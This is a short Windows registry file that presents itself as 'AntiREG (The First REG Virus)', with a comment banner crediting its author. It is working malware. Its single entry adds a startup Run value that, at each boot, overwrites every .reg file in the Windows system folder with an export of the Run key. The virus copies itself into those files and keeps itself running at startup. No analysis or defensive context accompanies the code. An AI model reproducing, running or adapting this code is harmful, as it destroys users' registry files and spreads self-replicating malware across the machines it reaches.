REGEDIT4

;;-------------------------------;;
;;                               ;;
;; AntiREG (The First REG Virus) ;;
;;      Coded By Lys Kovick      ;;
;;    Special Thanks To Phage    ;;
;;                               ;;
;;-------------------------------;;

[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\]
@="command /c for %i in (%windir%\\system\\*.reg) do regedit /e %i HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"

